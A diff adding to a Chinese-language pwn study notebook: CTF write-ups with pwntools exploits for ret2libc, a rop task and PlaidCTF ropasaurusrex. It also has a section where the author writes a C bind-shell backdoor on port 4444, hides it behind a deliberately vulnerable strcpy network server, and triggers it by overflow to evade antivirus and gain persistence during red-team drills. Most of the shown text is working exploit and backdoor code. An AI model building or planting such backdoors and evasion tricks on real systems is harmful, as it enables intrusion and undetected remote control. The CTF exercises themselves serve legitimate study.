@@ -356,7 +356,7 @@ shellcode长度最大值为0x40-0x10-rbp8-ret8=32，地址为local18 + 0x10 + 8 
 
 学习了在交互中读取字符串的方法。
 
-```
+```python
 #!/usr/bin/env python
 from pwn import *
 
@@ -376,10 +376,349 @@ sh.interactive()
 
 #### 突发奇想
 
-最近攻防演练的时候shell天天被杀，那我整个会溢出的代码，同时监听端口接受外面的数据，杀毒软件又将如何应对？
+最近攻防演练的时候shell天天被杀，那我整个会溢出的代码，溢出时监听端口接受外面的数据，杀毒软件又将如何应对？
 
-我直接让gpt生成了一个回响服务器的代码，由于gets的交互不再试用，因此尝试通过strcpy作为溢出手段，但是直接加在原始代码当中变量有点多了，超出了我对程序的把控，决定再开一个函数进行cpy操作。
+我直接让gpt生成了一个回响服务器的代码，由于gets的交互不再适用，因此尝试通过strcpy作为溢出手段，但是直接加在原始代码当中变量有点多了，超出了我对程序的把控，决定再开一个函数进行cpy操作。
 
 ![image-20240524165759536](./pwn.assets/image-20240524165759536.png)
 
 ![image-20240524165456348](./pwn.assets/image-20240524165456348.png)
+
+周末在家想了一下这么写肯定是行不通的，至少我的水平不足以支持起后续的利用，因为这么写只能调用到system /bin/sh，那这个时候就进行了本地执行的阶段且失去了远程交互的能力，作为后门来讲肯定是不合格的。
+
+后面在尝试的过程中发现有的主机并不能正常执行由-m32编译出来的文件，后续就把这个参数去掉了。最离谱的是，我试着试着发现就linux这种查杀能力，真的对不起我想用栈溢出玩花操作的想法，一个极其普通后门的都检测不出来。
+
+```c
+#include <stdio.h>
+#include <stdlib.h>
+#include <unistd.h>
+#include <arpa/inet.h>
+
+#define PORT 4444
+
+void backdoor() {
+    int sockfd, new_sock;
+    struct sockaddr_in server_addr, client_addr;
+    socklen_t sin_size;
+    char *args[] = {"/bin/sh", NULL};
+
+    if ((sockfd = socket(AF_INET, SOCK_STREAM, 0)) == -1) {
+        perror("socket");
+        exit(1);
+    }
+
+    server_addr.sin_family = AF_INET;
+    server_addr.sin_port = htons(PORT);
+    server_addr.sin_addr.s_addr = INADDR_ANY;
+    memset(&(server_addr.sin_zero), '\0', 8);
+
+    if (bind(sockfd, (struct sockaddr *)&server_addr, sizeof(struct sockaddr)) == -1) {
+        perror("bind");
+        exit(1);
+    }
+
+    if (listen(sockfd, 1) == -1) {
+        perror("listen");
+        exit(1);
+    }
+
+    sin_size = sizeof(struct sockaddr_in);
+    if ((new_sock = accept(sockfd, (struct sockaddr *)&client_addr, &sin_size)) == -1) {
+        perror("accept");
+        exit(1);
+    }
+
+    dup2(new_sock, 0);
+    dup2(new_sock, 1);
+    dup2(new_sock, 2);
+
+    execve("/bin/sh", args, NULL);
+}
+
+int main() {
+    backdoor();
+    return 0;
+}
+```
+
+![image-20240527141336429](./pwn.assets/image-20240527141336429.png)
+
+在此基础上再试试栈溢出的shell。
+
+```C
+#include <stdio.h>
+#include <stdlib.h>
+#include <string.h>
+#include <unistd.h>
+#include <arpa/inet.h>
+
+#define PORT 6666
+#define BUFFER_SIZE 1024
+
+void error_handling(const char *message) {
+    perror(message);
+    exit(1);
+}
+
+void backdoor() {
+    int sockfd, new_sock;
+    struct sockaddr_in server_addr, client_addr;
+    socklen_t sin_size;
+    char *args[] = {"/bin/sh", NULL};
+
+    if ((sockfd = socket(AF_INET, SOCK_STREAM, 0)) == -1) {
+        perror("socket");
+        exit(1);
+    }
+
+    server_addr.sin_family = AF_INET;
+    server_addr.sin_port = htons(4444);
+    server_addr.sin_addr.s_addr = INADDR_ANY;
+    memset(&(server_addr.sin_zero), '\0', 8);
+
+    if (bind(sockfd, (struct sockaddr *)&server_addr, sizeof(struct sockaddr)) == -1) {
+        perror("bind");
+        exit(1);
+    }
+
+    if (listen(sockfd, 1) == -1) {
+        perror("listen");
+        exit(1);
+    }
+
+    sin_size = sizeof(struct sockaddr_in);
+    if ((new_sock = accept(sockfd, (struct sockaddr *)&client_addr, &sin_size)) == -1) {
+        perror("accept");
+        exit(1);
+    }
+
+    dup2(new_sock, 0);
+    dup2(new_sock, 1);
+    dup2(new_sock, 2);
+
+    execve("/bin/sh", args, NULL);
+}
+
+void helloworld(char *buffer) {
+    char buffer1[10];
+    strcpy(buffer1, buffer);  // 存在缓冲区溢出漏洞
+}
+
+int main() {
+    int serv_sock, clnt_sock;
+    struct sockaddr_in serv_addr, clnt_addr;
+    socklen_t clnt_addr_size;
+    char buffer[BUFFER_SIZE];
+
+    serv_sock = socket(PF_INET, SOCK_STREAM, 0);
+    if (serv_sock == -1) {
+        error_handling("socket() error");
+    }
+
+    memset(&serv_addr, 0, sizeof(serv_addr));
+    serv_addr.sin_family = AF_INET;
+    serv_addr.sin_addr.s_addr = htonl(INADDR_ANY);
+    serv_addr.sin_port = htons(PORT);
+
+    if (bind(serv_sock, (struct sockaddr*)&serv_addr, sizeof(serv_addr)) == -1) {
+        error_handling("bind() error");
+    }
+
+    if (listen(serv_sock, 5) == -1) {
+        error_handling("listen() error");
+    }
+
+    clnt_addr_size = sizeof(clnt_addr);
+    clnt_sock = accept(serv_sock, (struct sockaddr*)&clnt_addr, &clnt_addr_size);
+    if (clnt_sock == -1) {
+        error_handling("accept() error");
+    }
+
+    read(clnt_sock, buffer, BUFFER_SIZE);
+    helloworld(buffer);
+    close(clnt_sock);
+    close(serv_sock);
+    return 0;
+}
+```
+
+ghidra反编译后说lea的位置为ebp-0x12，但是拿0x12 + 0x4做offset发现仍然报错，有时候报段错误、有时候报无效指令错误。**success地址为0x08049364**。
+
+![image-20240527144745479](./pwn.assets/image-20240527144745479.png)
+
+没办法只能通过fuzz + gdb硬调了，通过`msf-pattern_create -l 50`生成长50的字符串，看程序crash的时候eip的值是多少，以此推导出正确的偏移量。
+
+![image-20240527161450227](./pwn.assets/image-20240527161450227.png)
+
+可以看到eip的值为**a7Aa**，这四个字符所对应的偏移量为**22**。
+
+![image-20240527160113819](./pwn.assets/image-20240527160113819.png)
+
+![image-20240527162845171](./pwn.assets/image-20240527162845171.png)
+
+综上，exp如下：
+
+```python
+#!/usr/bin/env python
+from pwn import *
+
+context.log_level = 'debug'
+host = remote('127.0.0.1', 6666, typ='tcp')
+# sh = process('./strcpy2overflow')
+success_addr = 0x08049384
+# pattern = b"Aa0Aa1Aa2Aa3Aa4Aa5Aa6Aa7Aa8Aa9Ab0Ab1Ab2Ab3Ab4Ab5Ab6Ab7Ab8Ab9Ac0Ac1Ac2Ac3Ac4Ac5Ac6Ac7Ac8Ac9Ad0Ad1Ad2Ad3Ad4Ad5Ad6Ad7Ad8Ad9Ae0Ae1Ae2Ae3Ae4Ae5Ae6Ae7Ae8Ae9Af0Af1Af2Af3Af4Af5Af6Af7Af8Af9"
+offset = 22
+payload = b'A' * offset + p32(success_addr)
+host.sendline(payload)
+host.close
+```
+
+通过缓冲区溢出漏洞调用backdoor函数，完成shell的调用和对本地端口的监听，最终达到免杀和持久化的效果（主要是免杀。
+
+![image-20240527163052821](./pwn.assets/image-20240527163052821.png)
+
+![image-20240527163125367](./pwn.assets/image-20240527163125367.png)
+
+![image-20240527163406708](./pwn.assets/image-20240527163406708.png)
+
+
+
+#### 9、train.cs.nctu.edu.tw:ret2libc
+
+填充距离算了下好像是0x20
+
+![image-20240528160642690](./pwn.assets/image-20240528160642690.png)
+
+程序很贴心的给了/bin/sh和puts的地址，利用puts看一下main的got地址
+
+![image-20240528160725422](./pwn.assets/image-20240528160725422.png)
+
+我说为啥写成这样想先receive后send一直运行不了呢，这个地址是一直会变的（废话，libc载进来当然会变）而我并没注意这一点。
+
+![image-20240529135910523](./pwn.assets/image-20240529135910523.png)
+
+因为主机问题，libsearch自带的get更新一直不生效，因此只能手动去解析libc基址以及对应的函数地址，还好我在ctfwiki的项目里翻到了正确的libc版本，总体代码如下：
+
+```python
+from pwn import *
+from LibcSearcher import LibcSearcher
+
+
+context.log_level = 'debug'
+sh = process('./ret2libc')
+libc = ELF('/lib/i386-linux-gnu/libc.so.6')
+ret2libc_stru = ELF('./ret2libc')
+# get plt&got info | static
+puts_plt = ret2libc_stru.plt['puts']
+libc_start_main_got = ret2libc_stru.got['__libc_start_main']
+main = ret2libc_stru.symbols['main']
+
+# dynamic
+sh.recvuntil('is ')
+binsh_addr = int(sh.recvuntil('\n', drop=True), 16)
+print('provide binsh_addr: ' + hex(binsh_addr))
+sh.recvuntil('is ')
+puts_addr = int(sh.recvuntil('\n', drop=True), 16)
+payload = flat([b'A' * 0x20, puts_plt, main, libc_start_main_got])
+sh.sendline(payload)
+libc_start_main_addr = u32(sh.recv()[0:4])
+
+# libsearch installed failed, instead manually search
+# libc = LibcSearcher('__libc_start_main', libc_start_main_addr)
+# libc.add_condition('__libc_start_main', libc_start_main_addr)
+# libc.load('/lib/i386-linux-gnu/libc.so.6')
+system_offset = libc.symbols['system']
+puts_offset = libc.symbols['puts']
+main_offset = libc.symbols['__libc_start_main']
+binsh_offset = next(libc.search(b'/bin/sh'))
+
+# main->libc_base->system binsh
+libc_base = libc_start_main_addr - main_offset
+system_addr = libc_base + system_offset
+binsh_addr = libc_base + binsh_offset
+print('calc binsh_addr: ' + hex(binsh_addr))
+
+payload = flat([b'A' * 0x18, p32(system_addr), p32(0xdeadbeef), p32(binsh_addr)])
+sh.sendline(payload)
+sh.interactive()
+```
+
+这道题的本意是：运行程序之后，会得到puts函数和binsh字符串的位置，然后就可以根据puts函数的位置得到libc的版本以及libc基址，进而得到system函数在程序中加载的位置。不过这里使用的是类似于通解的做法，也记录一下我的理解：
+
+1、通过ELF函数对程序的结构进行解析，记录下的是不变的部分，如puts函数在plt中的**地址**、main函数在got表中的**地址**，由于延时加载的原因这个时候是获取不到这些函数实际在程序中的位置的。
+
+2、和程序进行交互，先获取信息，不过这道题甚至刻意的忽略了它的信息，过；再进行栈溢出，目标是main函数在got表中的**地址对应的值**，即在程序中的地址（因为main函数是肯定运行过了），结构为buffer + put_plt + main + main_got，成功溢出后读取地址。
+
+3、根据libc的main函数的offset确定libc在程序中的基址，再推出要用的`system`和`/bin/sh`在程序的对应位置
+
+4、buffer长度-8（我试了半天没过，想起上一个二次利用的也有这情况，原因不明) + system_addr + random(反正也不返回) + binsh_addr
+
+![image-20240529151524579](./pwn.assets/image-20240529151524579.png)
+
+
+
+#### 10、train.cs.nctu.edu.tw: rop
+
+没找到原题，空着。
+
+![1566026309029.png](./pwn.assets/1574668172344-2d5dce6a-3e6a-437a-bcc7-5a06950ee918.png)
+
+![image.png](./pwn.assets/1574668407609-8e44a3b0-4464-41c1-aad9-e9163a76d1c1.png)
+
+目标：eax 0xb，ebx binsh_addr
+
+![image-20240530152344375](./pwn.assets/image-20240530152344375.png)
+
+
+
+#### 11、2013-PlaidCTF-ropasaurusrex
+
+![image-20240530155512951](./pwn.assets/image-20240530155512951.png)
+
+![image-20240530163009597](./pwn.assets/image-20240530163009597.png)
+
+总体思路是136+4字节溢出，溢出到write函数，ret给read，后面跟三个参数把read_got的真实地址读出来，用96个字符填充read的长度0x100。
+
+但令人悲伤的是我执行没成功，尝试了第二个payload第一段填充减8字节再在后面加上，无效。
+
+```python
+from pwn import *
+from LibcSearcher import LibcSearcher
+
+
+context.log_level = 'debug'
+sh = process('./ropasaurusrex')
+libc = ELF('./libc.so')
+ropasaurusrex_stru = ELF('./ropasaurusrex')
+# get plt&got info | static
+write_plt = ropasaurusrex_stru.plt['write']
+read_got = ropasaurusrex_stru.got['read']
+
+sub_080483f4 = 0x080483f4
+# dynamic
+#sh.recvuntil('is ')
+#binsh_addr = int(sh.recvuntil('\n', drop=True), 16)
+payload = flat([b'A' * 136, 0xdeadbeaf, write_plt, sub_080483f4, 1, read_got, 4, b'B' * 96])
+sh.sendline(payload)
+libc_read_addr = u32(sh.recv()[0:4])
+print('got addr:' + hex(libc_read_addr))
+
+# libsearch installed failed, instead manually search
+# libc = LibcSearcher('__libc_start_main', libc_start_main_addr)
+# libc.add_condition('__libc_start_main', libc_start_main_addr)
+# libc.load('/lib/i386-linux-gnu/libc.so.6')
+read_offset = libc.symbols['read']
+system_offset = libc.symbols['system']
+main_offset = libc.symbols['__libc_start_main']
+binsh_offset = next(libc.search(b'/bin/sh'))
+
+libc_base = libc_read_addr - read_offset
+system_addr = libc_base + system_offset
+binsh_addr = libc_base + binsh_offset
+print('Get shell!')
+
+payload = flat([b'A' * 136, 0xdeadbeaf, system_addr, 0xdeadbeef, binsh_addr, b'B' * 104])
+sh.sendline(payload)
+sh.interactive()
+```
+
